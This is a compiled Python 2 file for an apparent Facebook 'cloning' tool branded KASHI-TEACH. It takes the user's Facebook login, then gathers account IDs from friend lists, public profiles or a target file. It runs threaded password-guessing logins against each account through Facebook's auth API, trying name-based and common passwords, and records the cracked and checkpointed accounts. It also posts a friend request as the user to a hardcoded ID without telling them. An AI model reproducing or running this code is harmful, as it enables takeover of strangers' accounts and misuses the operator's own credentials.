c           @   s,  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l
 m Z d  d l m Z d  d l m Z e e � e j d � e j �  Z e j e � e j e j j �  d d �dR g e _ dS g e _ dT g e _ dU g e _ dV g e _ dW g e _ dX g e _ dY g e _ dZ g e _ d[ g e _ d\ g e _ d] g e _ d^ g e _ d �  Z d �  Z d �  Z d �  Z d Z d Z  d Z! d Z" d Z# d Z$ d  Z% d! Z& d" �  Z' d# Z( g  Z) g  a* g  a+ g  Z, g  Z- d$ Z. d% Z/ e  j0 d& � d' GHd( GHe d) � e d* � e d+ � e d, � e d- � e d. � e d/ � e d0 � e d1 � e d2 � e d3 � e d4 � e d5 � e d6 � e d7 � e d8 � e d9 � e d: � e d; � e d< � e d= � e d> � e d? � e d@ � e dA � d( GHdB Z1 dC Z2 dD Z3 xy e3 dD k r�e4 dE � Z5 e5 e1 k r�e4 dF � Z6 e6 e2 k r�dG e5 GHdH Z3 q�dI GHe  j0 dJ � qldK GHe  j0 dJ � qlWdL �  Z7 dM �  Z8 dN �  Z9 dO �  Z: dP �  Z; e< dQ k r(e7 �  n  d S(_   i����N(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-Agents�   Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36sR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16sh   Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.1; Touch; rv:11.2; WPDesktop; Lumia 730 Dual SIM) like Geckoss   Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36s�   Mozilla/5.0 (Linux; Android 7.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69s�   Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537s�   Mozilla/5.0 (Linux; Android 5.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]s�   Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70s�   Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FBsd   Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36sw   Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36sg   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36sk   Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36c           C   s   d GHt  j j �  d  S(   Ns   [1;91mExit(   t   ost   syst   exit(    (    (    s   dgt   keluar"   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t | � d � | 7} q Wt | � S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   dgt   acak'   s
    
0c         C   s~   d } xA | D]9 } | j  | � } | j d | d t d | � � } q
 W| d 7} | j d d � } t j j | d � d  S(   NR	   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR   (    (    s   dgR   /   s    
(
c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g���MbP?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   dgt   jalan8   s    
s   [1;94ms   [1;91ms   [1;92ms   [1;97ms   [1;96ms   [1;95ms   [1;93ms�   
[1;93
╔══════════════════════╗
║╔════════════════════╗╚╗
║║██░░░░░░░░░░░░░░░░░░╚╗╚╗
║║██░░░ ❌KASHI-TEACH❌░░░─║║║
║║██░░░░░░░░░░░░░░░░░░╔╝╔╝
║╚════════════════════╝╔╝
╚══════════════════════╝
[1;95mSUBSCRIBES OUR YOUTUBE CHANNEL 
[1;91m╭═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━➤
[1;92m║[1;91mAUTHOR = Mr:KASHI
[1;92m║[1;91mYouTube = Kashi Teaches and Technical Zone
[1;92m║[1;91mWhtsapp = +923062045786
[1;91m╰═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━➤
c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j �  t j d � q Wd  S(   Ns   .   s   ..  s   ... s6   
[1;96m[●] [1;93mPlease wait,loading... ✅[1;97mi   (   R   R   R   R   R   (   t   titikt   o(    (    s   dgt   tik]   s
    
 
 i    s
   [31mNot Vulns	   [32mVulnt   clears3  
[1;96m
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░████░░████░░░████░░░░░░░
░░░░░░░░████░░████░░░░░░░░░░░░░░
░░░░░░░░████░░████░░░████░░░░░░░
░░░░░░░░████▄▄████░░░████░░░░░░░
░░░░░░░░██████████░░░████░░░░░░░
░░░░░░░░████▀▀████░░░████░░░░░░░
░░░░░░░░████░░████░░░████░░░░░░░
░░░░░░░░████░░████░░░████░░░░░░░
░░░░░░░░████░░████░░░████░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░sm   [1;93m⊱⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⊰s�   [1;93m███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█ s�   [1;93m████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█ s�   [1;93m███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ s�   [1;93m████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ s�   [1;93m███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█ s�   [1;93m████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█ s�   [1;93m███▓▓▓▓▓▓▓╬╬▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ s�   [1;93m████▓▓▓╬╬╬╬▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ s�   [1;93m███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ s�   [1;93m█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█ s�   [1;93m█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ s�   [1;93m█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ s�   [1;93m████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██ s�   [1;93m████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██ s�   [1;93m█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██ s�   [1;93m█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███ s�   [1;93m██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███ s�   [1;93m███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████ s�   [1;93m███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████ s�   [1;93m████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████ s�   [1;93m█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████ s�   [1;93m██████████▓▓▓█▓▓▓╬▓██╬╬╬╬╬╬╬╬╬╬╬▓███████ s�   [1;93m███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████ s�   [1;93m██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████ s   [1;93m███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████s	   Dimond Fbt   Kashit   trues/   [1;96m[☆] [1;88mEnter Username [1;96m👉 s0   [1;96m[☆] [1;88mEnter Password  [1;96m👉 s   Logged in successfully as t   falses   Wrong PasswordsA   xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10Fuws   Wrong Usernamec          C   s�  t  j d � y t d d � }  t �  Wn�t t f k
 r�t  j d � t GHd d GHd GHt d � } t d � } t �  y t	 j d	 � Wn  t
 j k
 r� d
 GHt �  n Xt
 t	 j _ t	 j d d � | t	 j d
 <| t	 j d <t	 j �  t	 j �  } d | k r_y.d | d | d } i d d 6d d 6| d
 6d d 6d d 6d d 6d d 6d d 6| d 6d  d! 6d" d# 6} t j d$ � } | j | � | j �  } | j i | d% 6� d& } t j | d' | �} t j | j � }	 t d d( � }
 |
 j |	 d) � |
 j �  d* GHt  j d+ � t j d, |	 d) � t �  Wq_t j  j! k
 r[d
 GHt �  q_Xn  d- | k r�d. GHt  j d/ � t" j# d0 � t �  q�d1 GHt  j d/ � t" j# d0 � t$ �  n Xd  S(2   NR%   s	   login.txtt   ri*   s   [1;96m=sG   [1;96m[⏺️][1;93m USE A FRESH/NEW ACCOUNT TO LOGIN [1;96m[⏺️]s+   [1;96m[+] [1;96mID/Email [1;91m: [1;13ms+   [1;96m[+] [1;96mPassword [1;90m: [1;92ms   https://m.facebook.coms2   
[1;96m[!] [1;91mThere is no internet connectiont   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   t   access_tokens)   
[1;96m[✓] [1;92mLogin Successful ✅sA   xdg-open https://www.youtube.com/channel/UCUJSOqxjU4f9npLso-10FuwsM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=t
   checkpoints>   
[1;96m[!] [1;91mIt seems that your account has a checkpoints   rm -rf login.txti   s*   
[1;96m[!] [1;91mPassword/Email is wrong(%   R   t   systemt   opent   menut   KeyErrort   IOErrort   logot	   raw_inputR$   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet   postt
   exceptionsR   R   R   t   login(   t   tokett   idt   pwdt   urlR=   t   dataR   t   aR)   R   t   unikers(    (    s   dgR^   �   sj    

	


S







c          C   sg  t  j d � y t d d � j �  }  WnD t k
 rl t  j d � d GHt  j d � t j d � t �  n Xy= t j	 d |  � } t
 j | j � } | d } | d	 } Wnf t
 k
 r� t  j d � d
 GHt  j d � t j d � t �  n# t j j k
 rd GHt �  n Xt  j d � t GHd d
 GHd | d GHd | d GHd GHd GHd GHd GHt �  d  S(   NR%   s	   login.txtR)   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=t   nameR`   s=   [1;96m[!] [1;91mIt seems that your account has a checkpoints1   [1;96m[!] [1;91mThere is no internet connectioni*   s   [1;96m=s7   [1;24m[[1;97m✓[1;96m][1;93m Name [1;91m: [1;92ms   [1;97m               s7   [1;94m[[1;97m✓[1;96m][1;93m ID   [1;91m: [1;92ms   [1;97m              s|   [1;96m☩═════════════════════════════════════☩s/   [1;97[[1;92m1[1;96m][1;93m➜ Start Clonings'   [1;97m[[1;92m0[1;96m][1;93m➜ Exit(   R   RA   RB   t   readRE   R   R   R^   RV   RW   RX   RY   RZ   RD   R]   R   R   RF   t   pilih(   R_   t   otwRd   t   namaR`   (    (    s   dgRC   �   sB    











	

c          C   sz   t  d � }  |  d k r' d GHt �  nO |  d k r= t �  n9 |  d k rj t d � t j d � t �  n d GHt �  d  S(   Ns   
[1;97m >>>> [1;97mR
   s#   [1;96m[!] [1;91mFill in correctlyR3   R9   s
   Token Removeds   rm -rf login.txt(   RG   Rh   t   superR!   R   RA   R   (   Re   (    (    s   dgRh     s    




c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHd GHd	 GHd
 GHd GHd GHt
 �  d  S(   NR%   s	   login.txtR)   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s|   [1;96m☩═════════════════════════════════════☩s5   [1;96m[[1;92m1[1;96m][1;93m Hack From Friend Lists7   [1;96m[[1;92m2[1;96m][1;93m Hack From Any Public IDs8   [1;96m[[1;92m3[1;96m][1;93m Crack From File (target)s$   [1;96m[[1;91m0[1;96m][1;91m Back(   R   RA   RB   Rg   R_   RE   R   R   R^   RF   t   pilih_super(    (    (    s   dgRk     s"    




c          C   sK  t  d � }  |  d k r' d GHt �  n3|  d k r� t j d � t GHd d GHt d � t j d	 t � } t	 j
 | j � } x�| d
 D] } t j
 | d � q� Wn�|  d k r�t j d � t GHd d GHt  d
 � } y> t j d | d t � } t	 j
 | j � } d | d GHWn' t k
 r@d GHt  d � t �  n Xt d � t j d | d t � } t	 j
 | j � } x� | d
 D] } t j
 | d � q�Wn� |  d k r8t j d � t GHd d GHyC t  d � } x0 t | d � j �  D] }	 t j
 |	 j �  � q�WWqZt k
 r4d GHt  d � t �  qZXn" |  d k rNt �  n d GHt �  d t t t � � GHt d � d d d  g }
 x0 |
 D]( } d! | Gt j j �  t j d" � q�WHd# GHd$ GHt d% � d$ GHd& �  } t d' � }
 |
 j | t � d d GHd( GHd) t t t � � d* t t t � � GHd+ GHt  d � t �  d  S(,   Ns   
[1;97m >>> [1;97mR
   s#   [1;96m[!] [1;91mFill in correctlyR3   R%   i*   s   [1;96m=s)   [1;96m[✺] [1;93mGetting ID [1;97m...s3   https://graph.facebook.com/me/friends?access_token=Rc   R`   t   2s+   [1;96m[+] [1;93mEnter ID [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;96m[[1;97m✓[1;96m] [1;93mName[1;91m :[1;97m Rf   s   [1;96m[!] [1;91mID Not Found!s   
[1;96m[[1;97mBack[1;96m]s*   [1;96m[✺] [1;93mGetting IDs [1;97m...s   /friends?access_token=t   3sG   [1;96m[+] [1;93mEnter Target link type👉(Kashi.txt)[1;91m: [1;97mR)   s"   [1;96m[!] [1;91mTarget Not Founds   
[1;96m[ [1;97mBack [1;96m]R9   s,   [1;96m[+] [1;91mTotal IDs [1;91m: [1;97ms'   [1;96m[✺] [1;94mStarting [1;97m...s   .   s   ..  s   ... s3   
[1;96m[[1;97m✸[1;91m] [1;93mCracking [1;97mi   s9   [1;96m[!] [1;93mTo Stop Process Press CTRL Then Press zs�   [1;96m☩═════════════════════════════════════════☩s,          [1;92mCP ACCOUNT OPEN AFTER 7 DAYS..c         S   s[  |  } y t  j d � Wn t k
 r* n Xy"t j d | d t � } t j | j � } | d d } t	 j
 d | d | d � } t j | � } d	 | k r� d
 | d | GHt j
 | | � n�d | d
 k r/d | d | GHt d d � } | j | d | d � | j �  t j
 | | � n| d d } t	 j
 d | d | d � } t j | � } d	 | k r�d
 | d | GHt j
 | | � n�d | d
 k rd | d | GHt d d � } | j | d | d � | j �  t j
 | | � nI| d d }	 t	 j
 d | d |	 d � } t j | � } d	 | k rpd
 | d |	 GHt j
 | |	 � n�d | d
 k r�d | d |	 GHt d d � } | j | d |	 d � | j �  t j
 | |	 � nud }
 t	 j
 d | d |
 d � } t j | � } d	 | k r<d | d |
 GHt j
 | |
 � nd | d
 k r�d | d |
 GHt d d � } | j | d |
 d � | j �  t j
 | |
 � n�| d d } t	 j
 d | d | d � } t j | � } d	 | k rd | d | GHt j
 | | � n<d | d
 k rwd | d | GHt d d � } | j | d | d � | j �  t j
 | | � n�| d d } t	 j
 d | d | d � } t j | � } d	 | k r�d | d | GHt j
 | | � nhd | d
 k rKd | d | GHt d d � } | j | d | d � | j �  t j
 | | � nt j d | d t � } t j | j � } | d d }
 t	 j
 d | d |
 d � } t j | � } d	 | k r�d | d |
 GHt j
 | |
 � ng d | d
 k rLd | d |
 GHt d d � } | j | d |
 d � | j �  t j
 | |
 � n  Wn n Xd  S(   Nt   outs   https://graph.facebook.com/s   /?access_token=t
   first_namet   786s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R?   s)   [1;96m[[1;92mSuccessful[1;58m][1;97m s    [1;96m|[1;97m s   www.facebook.comt	   error_msgs+   [1;96m[[1;93mAfter 7 days[1;58m][1;97m s   out/checkpoint.txtRd   t   |s   
t   123s+   [1;96m[[1;93mAfter 7 days[1;12m][1;97m t   12345t   Pakistans)   [1;96m[[1;92mSuccessful[1;96m][1;58m s+   [1;96m[[1;93mAfter 7 days[1;96m][1;58m s)   [1;96m[[1;20mSuccessful[1;96m][1;97m s    [1;58m|[1;97m s+   [1;96m[[1;93mAfter 7 days[1;96m][1;97m t   12345678t   1122(   R   t   mkdirt   OSErrorRV   RW   R_   RX   RY   RZ   t   urllibt   urlopent   loadt   okst   appendRB   R   R[   t   cekpoint(   t   argt   userRd   R   t   pass1Rc   t   qt   cekt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7(    (    s   dgt   maine  s�    







i   sH   [1;96m[[1;97m✓[1;96m] [1;92mProcess Has Been Completed [1;97m....s5   [1;96m[+] [1;92mTotal OK/[1;93mCP [1;91m: [1;92ms   [1;97m/[1;93msF   [1;96m[+] [1;92mCP File Has Been Saved [1;91m: [1;97mout/Kashi.txt(    RG   Rl   R   RA   RF   R!   RV   RW   R_   RX   RY   RZ   R`   R   RD   Rk   RB   t	   readlinest   stripRE   RC   R   R   R   R   R   R   R   R    t   mapR~   R�   (   t   peakR)   R   t   st   idtt   jokt   opR   t   idlistt   lineR"   R#   R�   t   p(    (    s   dgRl   )  s�    

	

	



	




 
 
	r	)
t   __main__(   s
   User-Agents�   Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   User-Agentsh   Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.1; Touch; rv:11.2; WPDesktop; Lumia 730 Dual SIM) like Gecko(   s
   User-Agentss   Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36(   s
   User-Agents�   Mozilla/5.0 (Linux; Android 7.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69(   s
   User-Agents�   Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537(   s
   User-Agents�   Mozilla/5.0 (Linux; Android 5.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;](   s
   User-Agents�   Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70(   s
   User-Agents�   Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FB(   s
   User-Agentsd   Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36(   s
   User-Agentsw   Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36(   s
   User-Agentsg   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36(   s
   User-Agentsk   Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36(=   R   R   R   t   datetimeR
   RR   t   ret	   threadingRX   R{   t	   cookielibRV   RI   t   multiprocessing.poolR    t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRH   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R!   t   Bt   Rt   Gt   Wt   St   Pt   YRF   R$   t   backt   berhasilR�   R~   R`   t   listgrupt   vulnott   vulnRA   t   CorrectUsernamet   CorrectPasswordt   loopRG   t   usernameR/   R^   RC   Rh   Rk   Rl   t   __name__(    (    (    s   dgt   <module>	   s�   �


						


























			9	$			�
